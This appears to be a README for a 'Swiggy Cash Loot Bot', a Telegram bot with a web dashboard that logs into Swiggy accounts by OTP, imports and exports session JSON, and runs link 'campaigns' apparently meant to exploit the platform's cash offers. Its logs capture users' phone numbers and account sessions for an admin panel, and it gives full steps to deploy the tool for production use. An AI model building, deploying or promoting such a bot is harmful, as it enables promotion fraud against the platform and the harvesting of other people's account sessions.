# Swiggy Cash Loot Bot — Upgraded Edition

**Advanced Telegram Bot + Web Dashboard | Admin Panel | User Panel | JSON Logging | GitHub Ready**

---

## ✨ Features

- ✅ **Advanced Inline Keyboard** — Styled buttons, inline controls
- ✅ **Admin Dashboard** — Password-protected, real-time stats, event logs
- ✅ **User Dashboard** — Personal session view, activity history
- ✅ **JSON Event Logging** — Every login/action logged for audit trail
- ✅ **Session Management** — Secure storage with TTL expiration
- ✅ **Telegram Bot** — Full OTP login, session export/import
- ✅ **Flask REST API** — Stats endpoint, webhook ready
- ✅ **GitHub Actions CI/CD** — Auto-deploy to Render/Heroku
- ✅ **Parallel Execution** — Bot + Web server run simultaneously
- ✅ **Production Ready** — Gunicorn + Gevent, environment variables

---

## 🚀 Quick Start

### Local Development

```bash
# 1. Clone/Download repo
git clone <repo-url>
cd swiggy-bot-upgraded

# 2. Create virtual environment
python -m venv venv
source venv/bin/activate  # macOS/Linux
# or
venv\Scripts\activate  # Windows

# 3. Install dependencies
pip install -r requirements.txt

# 4. Setup environment variables
cp .env.example .env
# Edit .env with your BOT_TOKEN and ADMIN_PASSWORD

# 5. Run bot + Flask
python bot_upgraded.py
```

**Or run Flask separately:**
```bash
gunicorn --bind 0.0.0.0:5000 bot_upgraded:app
```

---

## 📋 Environment Variables

Create `.env` file:

```env
# Required
BOT_TOKEN=your_telegram_bot_token_here

# Admin panel password
ADMIN_PASSWORD=your_secure_password

# Flask secret key (generate with: python -c "import secrets; print(secrets.token_hex(32))")
FLASK_SECRET=your_secret_key

# Server port
PORT=5000

# Session expiration (seconds)
SESSION_TTL_SECONDS=86400

# Max concurrent updates
MAX_CONCURRENT_UPDATES=32
```

---

## 🌐 Web Routes

| Route | Purpose |
|-------|---------|
| `GET /` | API status & available routes |
| `GET/POST /admin/login` | Admin login page |
| `GET /admin/dashboard` | Admin dashboard (requires login) |
| `GET /admin/logout` | Admin logout |
| `GET /user/<chat_id>` | User dashboard (session view) |
| `GET /api/stats` | JSON API for statistics |

---

## 🎮 Telegram Bot Commands

| Command | Action |
|---------|--------|
| `/start` | Start bot, show main keyboard |
| `/login` | Begin OTP login |
| `/status` | Check account balance/status |
| `/run` | Run 10 links campaign |
| `/logout` | Clear session |

**Inline Buttons:**
- ⚡ RUN (10 links) — Run campaign
- 🌙 Late Night — Night offer picker
- 📊 Status — Account status
- 📤 Export JSON — Get session JSON
- 🔐 Login — Start login
- 📤 Session — Import JSON session
- 🚪 Logout — Clear session
- 🌐 Dashboard — Link to user dashboard

---

## 📊 Admin Dashboard

**URL:** `http://localhost:5000/admin/login`

**Features:**
- 🔐 Password-protected login
- 📝 Real-time event log (last 100 events)
- 📊 User statistics
- ✅ Activity tracking (login, logout, export, etc.)

**Default Password:** (set in `.env`)

---

## 👤 User Dashboard

**URL:** `http://localhost:5000/user/<chat_id>`

**Shows:**
- 🆔 User ID, Phone, Token status
- 📝 Activity history (last 20 events)
- 🔒 Secure session viewer

---

## 📡 JSON Event Logging

All events logged to JSON files:

### `user_events.json`
```json
{
  "chat_id_1234_timestamp": {
    "timestamp": "2026-10-11T10:30:45.123456+00:00",
    "chat_id": 1234,
    "event_type": "login_success",
    "data": {"phone": "9876543210"},
    "session_captured": {
      "userId": "xyz",
      "phone": "9876543210"
    }
  }
}
```

### `admin_logs.json`
```json
{
  "admin_chat_id_1234_timestamp": {
    "timestamp": "2026-10-11T10:30:45.123456+00:00",
    "chat_id": 1234,
    "event": "login_success",
    "details": "phone: 9876543210"
  }
}
```

Event Types:
- `bot_start` — User started bot
- `login_success` — Successful OTP login
- `import_session` — Session imported
- `export_json` — Session exported
- `logout` — User logged out
- `check_status` — Status checked
- `night_cash_view` — Night offer viewed
- `run_links` — Campaign started

---

## 🚀 Deployment

### Option 1: Render.com (Free Tier)

1. **Push to GitHub:**
   ```bash
   git init
   git add .
   git commit -m "Initial commit"
   git branch -M main
   git remote add origin <your-repo-url>
   git push -u origin main
   ```

2. **Create Render Web Service:**
   - Go to [Render Dashboard](https://dashboard.render.com)
   - Click "New +" → "Web Service"
   - Connect GitHub repo
   - Set environment:
     - Build Command: `pip install -r requirements.txt`
     - Start Command: `gunicorn --bind 0.0.0.0:$PORT --worker-class gevent bot_upgraded:app`
   - Add environment variables from `.env`
   - Deploy

3. **Create Worker (for bot polling):**
   - Click "New +" → "Background Worker"
   - Same repo
   - Start Command: `python bot_upgraded.py`
   - Add same environment variables

### Option 2: Heroku (Paid)

```bash
# Install Heroku CLI
heroku login
heroku create your-app-name

# Push repo
git push heroku main

# Set environment variables
heroku config:set BOT_TOKEN=xxx
heroku config:set ADMIN_PASSWORD=xxx

# View logs
heroku logs --tail
```

### Option 3: Self-Hosted (VPS/Docker)

```bash
# Install Python 3.9+
apt-get update && apt-get install python3-pip

# Clone and setup
git clone <repo-url>
cd swiggy-bot-upgraded
pip install -r requirements.txt

# Create systemd service
cat > /etc/systemd/system/bot.service << EOF
[Unit]
Description=Swiggy Bot
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/home/swiggy-bot-upgraded
EnvironmentFile=/home/swiggy-bot-upgraded/.env
ExecStart=/usr/bin/python3 bot_upgraded.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable bot
systemctl start bot
```

---

## 📦 Project Structure

```
.
├── bot_upgraded.py          # Main bot + Flask app
├── requirements.txt         # Python dependencies
├── Procfile                 # Heroku/Render config
├── .env.example             # Environment template
├── .github/
│   └── workflows/
│       └── deploy.yml       # Auto-deploy on push
├── tg_sessions/             # User sessions (auto-created)
├── bot_stats.json           # Statistics
├── user_events.json         # Event log
├── admin_logs.json          # Admin audit log
└── README.md                # This file
```

---

## 🔧 Advanced Configuration

### Custom Admin Password

Generate strong password:
```bash
python -c "import secrets; print(secrets.token_urlsafe(32))"
```

Set in `.env`:
```env
ADMIN_PASSWORD=your_generated_password
```

### Session Expiration

Default: 24 hours (86400 seconds)

Change in `.env`:
```env
SESSION_TTL_SECONDS=172800  # 48 hours
```

### Custom Port

```env
PORT=8080
```

---

## 📊 API Examples

### Get Statistics
```bash
curl http://localhost:5000/api/stats
```

Response:
```json
{
  "total_events": 150,
  "total_users": 25,
  "stats": {
    "users": {...},
    "claims": [...]
  }
}
```

### Check Bot Status
```bash
curl http://localhost:5000/
```

---

## 🐛 Troubleshooting

### Bot not receiving messages
- Check `BOT_TOKEN` is valid
- Ensure bot is webhook not polling (or polling is running)
- Check firewall allows port 5000

### Admin login not working
- Verify `ADMIN_PASSWORD` in `.env`
- Clear browser cookies: `session`
- Check console for errors

### Sessions not persisting
- Verify `tg_sessions/` directory exists
- Check file permissions (should be writable)
- Check `SESSION_TTL_SECONDS` not too short

### Flask port already in use
```bash
# Kill process on port 5000
lsof -i :5000 | grep LISTEN | awk '{print $2}' | xargs kill -9

# Or change PORT in .env
```

---

## 🔐 Security Notes

- ✅ Admin panel uses session cookies (HttpOnly, Secure flags)
- ✅ Sensitive tokens not logged in plain text
- ✅ Session files stored locally (not in version control)
- ✅ Use strong ADMIN_PASSWORD in production
- ⚠️ Don't commit `.env` or session files to Git
- ⚠️ Use HTTPS in production (Render/Heroku enforce this)

---

## 📝 Event Logging

Every user action creates an entry in `user_events.json` with:
- Timestamp (UTC ISO 8601)
- Chat ID
- Event type
- Event data (sanitized)
- Session info (if applicable)

Admin can view via `/admin/dashboard` or raw JSON files.

---

## 🤝 Integration Examples

### Webhook to Discord (on login)
```python
async def send_discord_webhook(chat_id, event):
    webhook_url = os.getenv("DISCORD_WEBHOOK")
    async with aiohttp.ClientSession() as http:
        await http.post(webhook_url, json={"content": f"User {chat_id}: {event}"})

# Add to otp_received handler:
await send_discord_webhook(chat_id, "logged_in")
```

### Database Integration (PostgreSQL)
```python
import psycopg2

def save_to_db(chat_id, event):
    conn = psycopg2.connect(os.getenv("DATABASE_URL"))
    cur = conn.cursor()
    cur.execute("INSERT INTO events (chat_id, event) VALUES (%s, %s)", (chat_id, event))
    conn.commit()
    cur.close()
    conn.close()
```

---

## 📬 Support

- Check logs: `tail -f bot.log`
- Review event logs: `/admin/dashboard`
- Check user activity: `/user/<chat_id>`
- Verify environment: `echo $BOT_TOKEN`

---

## 📄 License

Use responsibly. This bot is for authorized testing only.

---

**Last Updated:** 2026-10-11  
**Version:** 2.0 (Upgraded with Web Dashboard)  
**Ready for Production:** ✅
